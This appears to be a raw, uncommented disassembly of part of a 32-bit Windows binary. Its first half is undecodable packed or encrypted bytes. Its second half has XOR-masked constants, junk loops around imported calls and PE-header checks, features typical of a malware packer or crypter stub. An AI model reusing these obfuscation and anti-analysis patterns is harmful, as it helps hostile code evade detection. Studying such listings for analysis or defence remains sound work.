  413839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41383a:	sub    ebx,eax
  41383c:	cwde   
  41383d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41383e:	arpl   ax,bx
  413840:	push   ds
  413841:	adc    al,0xf0
  413843:	mov    ebp,0xe26ded3c
  413848:	scas   al,BYTE PTR es:[edi]
  413849:	dec    esp
  41384a:	sbb    ch,cl
  41384c:	stos   DWORD PTR es:[edi],eax
  41384d:	mov    ds:0xb830cda8,eax
  413852:	mov    gs,WORD PTR [edx+0x44]
  413855:	mov    bl,0xd7
  413857:	xchg   edx,eax
  413858:	add    al,BYTE PTR [edx+0x4664d1ce]
  41385e:	or     al,0x35
  413860:	xchg   BYTE PTR [edx+0x3d],dl
  413863:	cmp    BYTE PTR [ebp-0x21],0xcd
  413867:	loope  0x4138ba
  413869:	les    ebx,FWORD PTR [edx-0x252c64bd]
  41386f:	in     eax,dx
  413870:	icebp  
  413871:	loopne 0x413890
  413873:	paddq  mm3,QWORD PTR [ebp-0x1a31369]
  41387a:	inc    edi
  41387b:	popa   
  41387c:	mov    dl,0x79
  41387e:	jno    0x413860
  413880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413881:	(bad)  
  413882:	aam    0xa1
  413884:	aam    0x74
  413886:	dec    edi
  413887:	mov    eax,0x63436019
  41388c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41388d:	sub    eax,0x1d8207f3
  413892:	enter  0x4e4b,0xd7
  413896:	dec    esp
  413897:	push   ebx
  413898:	sbb    eax,0x464af623
  41389d:	mov    BYTE PTR [ebx+0x4a],dl
  4138a0:	push   esp
  4138a1:	pushf  
  4138a2:	dec    eax
  4138a3:	xchg   edi,eax
  4138a4:	fisub  DWORD PTR [edi+0x7bd0b222]
  4138aa:	jae    0x413879
  4138ac:	cmp    DWORD PTR [esi-0x2a],esp
  4138af:	add    DWORD PTR [ebp+0x2c],ebp
  4138b2:	in     eax,0x6c
  4138b4:	dec    ebp
  4138b5:	mov    ebp,0x91084255
  4138ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138bb:	cmc    
  4138bc:	sub    DWORD PTR [esi-0x6db13009],ebp
  4138c2:	std    
  4138c3:	push   ds
  4138c4:	outs   dx,BYTE PTR ds:[esi]
  4138c5:	lahf   
  4138c6:	aad    0x8b
  4138c8:	lds    esi,FWORD PTR [edx]
  4138ca:	or     al,0xf7
  4138cc:	fsub   DWORD PTR [ecx]
  4138ce:	cmp    al,0x61
  4138d0:	sub    BYTE PTR [edx],bl
  4138d2:	out    dx,eax
  4138d3:	adc    DWORD PTR [edi+ebx*1+0x4a],ebp
  4138d7:	fild   QWORD PTR [eax+0x379811f2]
  4138dd:	nop
  4138de:	fild   QWORD PTR [esi-0x2ad2c479]
  4138e4:	loope  0x4138d0
  4138e6:	loope  0x4138da
  4138e8:	ins    DWORD PTR es:[edi],dx
  4138e9:	push   es
  4138ea:	jmp    0x9dd016aa
  4138ef:	shl    DWORD PTR [ecx+0x3b],1
  4138f2:	jmp    0x38fe686c
  4138f7:	mov    bl,0x10
  4138f9:	inc    esi
  4138fb:	push   0xf2c9c0f6
  413900:	lods   eax,DWORD PTR ds:[esi]
  413901:	sbb    DWORD PTR [esi+0x29],edi
  413904:	mov    ds:0x904aec67,eax
  413909:	mov    cl,0xfb
  41390b:	lods   eax,DWORD PTR ds:[esi]
  41390c:	xchg   edx,eax
  41390d:	jle    0x413972
  41390f:	(bad)  
  413910:	or     eax,0x824d1e4f
  413915:	inc    edi
  413916:	lea    esp,[ecx+ebp*1]
  413919:	fs dec ebx
  41391b:	(bad)  
  41391c:	test   eax,0x13c6d0ec
  413921:	mov    bl,0x8d
  413923:	sub    ebp,DWORD PTR [edx-0x3075012c]
  413929:	cs add dh,0x35
  41392d:	dec    edi
  41392e:	retf   
  41392f:	sti    
  413930:	pop    ecx
  413931:	mov    esp,edi
  413933:	mov    esi,eax
  413935:	jp     0x413985
  413937:	lods   al,BYTE PTR ds:[esi]
  413938:	xor    cl,dl
  41393a:	xor    al,0xdd
  41393c:	(bad)  
  41393d:	int    0x3a
  41393f:	les    edi,FWORD PTR [ecx-0x13]
  413942:	outs   dx,DWORD PTR ds:[esi]
  413943:	cld    
  413944:	addr16 popf 
  413946:	mov    ecx,0xf33b8b64
  41394b:	test   eax,0x6226ed95
  413950:	mov    ebx,0x9a644194
  413955:	push   es
  413956:	rcl    ah,1
  413958:	mov    dl,0x6e
  41395a:	xchg   esi,eax
  41395b:	in     eax,0x2a
  41395d:	repnz sub DWORD PTR fs:[esi+0x3f],0xfffffff2
  413963:	test   al,0xa7
  413965:	(bad)  
  413966:	adc    cl,BYTE PTR [ebp+0x52252964]
  41396c:	mov    edx,fs
  41396e:	mov    bh,0x9d
  413970:	mov    ch,0xc8
  413972:	(bad)  
  413973:	call   0x66f2ad06
  413978:	in     al,dx
  413979:	xor    BYTE PTR [edi],cl
  41397b:	cmp    al,0xd6
  41397d:	mov    dl,BYTE PTR [ebp-0x7394cfb3]
  413983:	xor    al,0xea
  413985:	outs   dx,DWORD PTR ds:[esi]
  413986:	enter  0xc65a,0x40
  41398a:	inc    eax
  41398b:	test   al,0x2d
  41398d:	mov    ds:0xed39b012,al
  413992:	pop    es
  413993:	out    0x80,al
  413995:	pop    ebp
  413996:	pop    ecx
  413997:	lds    esp,FWORD PTR [edx+0x45ca3796]
  41399d:	push   0x1625bb1e
  4139a2:	pusha  
  4139a3:	add    ecx,DWORD PTR [ebp-0x6e11c947]
  4139a9:	or     DWORD PTR [esi],edi
  4139ab:	pop    ds
  4139ac:	push   eax
  4139ad:	lods   eax,DWORD PTR ds:[esi]
  4139ae:	(bad)  
  4139af:	push   ss
  4139b0:	cdq    
  4139b1:	mov    cl,0xae
  4139b3:	dec    edx
  4139b4:	outs   dx,DWORD PTR ds:[esi]
  4139b5:	sbb    al,0xdc
  4139b7:	jns    0x413a30
  4139b9:	repnz mov cl,0xc
  4139bc:	add    DWORD PTR ds:0x73c3202b,eax
  4139c2:	les    ebp,FWORD PTR [ebx+0x70]
  4139c5:	push   eax
  4139c6:	mov    dl,0x23
  4139c8:	push   ecx
  4139c9:	cmp    DWORD PTR [ecx+0x23],ecx
  4139cc:	jmp    0x765fa3c2
  4139d1:	popf   
  4139d2:	and    DWORD PTR [esi],ebp
  4139d4:	and    ah,BYTE PTR [eax+0x12]
  4139d7:	into   
  4139d8:	shl    DWORD PTR [edi+esi*2+0x1eb41d4b],0x26
  4139e0:	jo     0x413a2c
  4139e2:	aas    
  4139e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139e4:	fwait
  4139e5:	sub    BYTE PTR [ebp-0x6],al
  4139e8:	add    BYTE PTR [edx+edx*4+0x7e3fe7a7],dl
  4139ef:	daa    
  4139f0:	xor    al,0xec
  4139f2:	sar    DWORD PTR [esi],cl
  4139f4:	lock mov esp,fs
  4139f7:	pop    edx
  4139f8:	in     eax,dx
  4139f9:	sub    BYTE PTR [ebx-0xb],dl
  4139fc:	mov    ecx,0x147552ea
  413a01:	add    cl,BYTE PTR [ecx-0x550356b8]
  413a07:	cli    
  413a08:	xchg   ebp,eax
  413a09:	sbb    ch,BYTE PTR [edx+0x150f48e4]
  413a0f:	(bad)  
  413a11:	dec    edx
  413a12:	add    al,0xb1
  413a14:	push   eax
  413a15:	pop    eax
  413a16:	jbe    0x4139c3
  413a18:	jns    0x4139bf
  413a1a:	add    BYTE PTR [ecx],0xb2
  413a1d:	retf   0xe80d
  413a20:	mov    BYTE PTR [ebx+0x40c322ee],dl
  413a26:	cwde   
  413a27:	push   eax
  413a28:	xor    DWORD PTR [edx+0xf32ac00],esi
  413a2e:	fcmovb st,st(5)
  413a30:	push   eax
  413a31:	pushf  
  413a32:	dec    ebx
  413a33:	retf   0xe831
  413a36:	push   cs
  413a37:	xor    eax,0x23679c9d
  413a3c:	mov    ebx,0x2fdc20c8
  413a41:	mov    cl,0xaa
  413a43:	mov    bh,0xb6
  413a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a46:	sbb    BYTE PTR [esi-0x6b602672],ah
  413a4c:	sti    
  413a4d:	jecxz  0x413a3b
  413a4f:	in     al,dx
  413a50:	popa   
  413a51:	jae    0x413a14
  413a53:	retf   0x5de3
  413a56:	into   
  413a57:	mov    edi,0x7944e27c
  413a5c:	xchg   ebp,eax
  413a5d:	in     eax,0xe3
  413a5f:	cmp    BYTE PTR [ebx+0x5c],al
  413a62:	xor    eax,0x6b6f4e1
  413a67:	retf   
  413a68:	call   0xfeaee2a4
  413a6d:	or     ah,bl
  413a6f:	ret    0x7dc8
  413a72:	mov    ebx,0xfc1aa102
  413a77:	sub    dl,BYTE PTR ds:0x55a55f73
  413a7d:	ret    0x138f
  413a80:	icebp  
  413a81:	jmp    0x2ca1:0x6e273
  413a88:	iret   
  413a89:	out    0xd,eax
  413a8b:	es mov al,0x92
  413a8e:	add    eax,0x758a2dea
  413a93:	cli    
  413a94:	jecxz  0x413ada
  413a96:	or     BYTE PTR [edx+0x20],dh
  413a99:	rcr    BYTE PTR [ebp+edi*1-0x1f],1
  413a9d:	cli    
  413a9e:	xchg   edx,eax
  413a9f:	xchg   esi,eax
  413aa0:	test   eax,0xef9339aa
  413aa5:	jl     0x413af9
  413aa7:	in     al,0xb0
  413aa9:	les    eax,FWORD PTR [eax]
  413aab:	mov    esi,0x6541eea1
  413ab0:	cmp    esp,DWORD PTR [eax+0x61ca889a]
  413ab6:	clc    
  413ab7:	iret   
  413ab8:	rol    BYTE PTR [edi],1
  413aba:	pop    es
  413abb:	push   eax
  413abc:	and    bh,bl
  413abe:	outs   dx,BYTE PTR ds:[esi]
  413abf:	outs   dx,BYTE PTR ds:[esi]
  413ac0:	jns    0x413abe
  413ac2:	sub    al,0xc7
  413ac4:	push   esp
  413ac5:	push   0x9b97d2f7
  413aca:	cmc    
  413acb:	mov    ebx,0xa6e211de
  413ad0:	xor    DWORD PTR [esi+ebp*2-0x19c80cac],edi
  413ad7:	lods   al,BYTE PTR ds:[esi]
  413ad8:	and    ebp,DWORD PTR [eax-0x3ab6868b]
  413ade:	dec    edx
  413adf:	or     dh,BYTE PTR [ecx+0x2f14b26a]
  413ae5:	into   
  413ae6:	stc    
  413ae7:	pop    ecx
  413ae8:	fidivr WORD PTR ss:[edx-0x37]
  413aec:	sbb    ah,cl
  413aee:	or     ah,BYTE PTR [edi+0x47]
  413af1:	pusha  
  413af2:	into   
  413af3:	daa    
  413af4:	xchg   esp,eax
  413af5:	dec    edx
  413af6:	daa    
  413af7:	cmc    
  413af8:	(bad)  
  413af9:	in     al,dx
  413afa:	cmp    eax,0x4a35deb1
  413aff:	add    BYTE PTR ds:0x3a249a5d,ch
  413b05:	mov    dl,0x80
  413b07:	cdq    
  413b08:	je     0x413ae5
  413b0a:	rcr    DWORD PTR [edi],1
  413b0c:	inc    edi
  413b0d:	fist   WORD PTR [ebx-0x1]
  413b10:	jl     0x413b79
  413b12:	out    0x4d,eax
  413b14:	ffree  st(7)
  413b16:	aam    0x20
  413b18:	mov    ch,0x33
  413b1a:	dec    ebp
  413b1b:	inc    sp
  413b1d:	cmp    edi,edi
  413b1f:	(bad)  
  413b20:	mov    bl,0x65
  413b22:	shl    DWORD PTR [edx+0x4a753fff],0x84
  413b29:	xchg   BYTE PTR [ecx-0x7],cl
  413b2c:	pop    ss
  413b2d:	mov    ch,0x6c
  413b2f:	test   DWORD PTR [eax],ebp
  413b31:	or     al,0xb2
  413b33:	xor    ebx,DWORD PTR [ebp+0x31bce6ef]
  413b39:	push   eax
  413b3a:	call   0xdc90:0x4dff826d
  413b41:	lahf   
  413b42:	dec    eax
  413b43:	lds    edx,FWORD PTR [eax-0x6d57944f]
  413b49:	fmul   QWORD PTR [ecx+edi*2]
  413b4c:	inc    edx
  413b4d:	pop    edx
  413b4e:	out    0x31,eax
  413b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b51:	xlat   BYTE PTR ds:[ebx]
  413b52:	retf   
  413b53:	mov    edx,0x1618a90a
  413b58:	dec    ebp
  413b59:	adc    BYTE PTR [eax+0x1b],0x11
  413b5d:	inc    ebp
  413b5e:	pop    ss
  413b5f:	jge    0x413afd
  413b61:	movd   DWORD PTR [ebx+0x45cdf73],mm6
  413b68:	jmp    0x8130a5a7
  413b6d:	fcomp  DWORD PTR [ecx+0x56]
  413b70:	outs   dx,DWORD PTR ds:[esi]
  413b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b72:	push   ss
  413b73:	pushf  
  413b74:	nop
  413b75:	les    ebp,FWORD PTR [eax+0x6f]
  413b78:	xchg   ebp,eax
  413b79:	mov    al,0xb0
  413b7b:	push   cs
  413b7c:	int    0xa8
  413b7e:	dec    eax
  413b7f:	ins    DWORD PTR es:[edi],dx
  413b80:	cwde   
  413b81:	(bad)  
  413b82:	lahf   
  413b83:	cld    
  413b84:	data16 cmp dl,al
  413b87:	adc    edi,DWORD PTR [ecx+0x15]
  413b8a:	and    ecx,0xeb3caad
  413b90:	fcomp  QWORD PTR [eax]
  413b92:	inc    esi
  413b93:	pop    esp
  413b94:	sbb    al,0x87
  413b96:	(bad)  
  413b97:	pop    ebp
  413b98:	repnz inc ecx
  413b9a:	stos   DWORD PTR es:[edi],eax
  413b9b:	loop   0x413c12
  413b9d:	add    ebp,DWORD PTR [ecx+eiz*2]
  413ba0:	jmp    0xfc13:0xd025bfaf
  413ba7:	out    0xe3,eax
  413ba9:	out    dx,eax
  413baa:	cmp    DWORD PTR [esi+0x36907e4e],edx
  413bb0:	(bad)  
  413bb1:	outs   dx,BYTE PTR ds:[esi]
  413bb2:	jg     0x413bc9
  413bb4:	sub    esi,DWORD PTR [edx-0x75]
  413bb7:	dec    ebp
  413bb8:	js     0x413bed
  413bba:	push   edx
  413bbb:	mov    edx,0xe93ecd0c
  413bc0:	fdivrp st(6),st
  413bc2:	rcl    DWORD PTR [eax],cl
  413bc4:	pop    DWORD PTR [edi]
  413bc6:	sbb    DWORD PTR [ecx],0xca6d5f88
  413bcc:	iret   
  413bcd:	mov    al,0x78
  413bcf:	xor    eax,ebx
  413bd1:	mov    ecx,0x767d2eb8
  413bd6:	add    ebx,DWORD PTR [ebx+0x50acafe2]
  413bdc:	int    0x2a
  413bde:	jno    0x413c4c
  413be0:	pop    ss
  413be1:	push   0xc
  413be3:	jmp    0x3bf:0xd7ca91ec
  413bea:	rol    DWORD PTR [ebx-0x2fcc0029],1
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421ce2
  413c08:	mov    ds:0x421cea,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421ab2
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x423878
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a7e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x423893
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423956
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a76
  413f9e:	mov    eax,ds:0x421a86
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421ade
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c66
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x4239d0
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
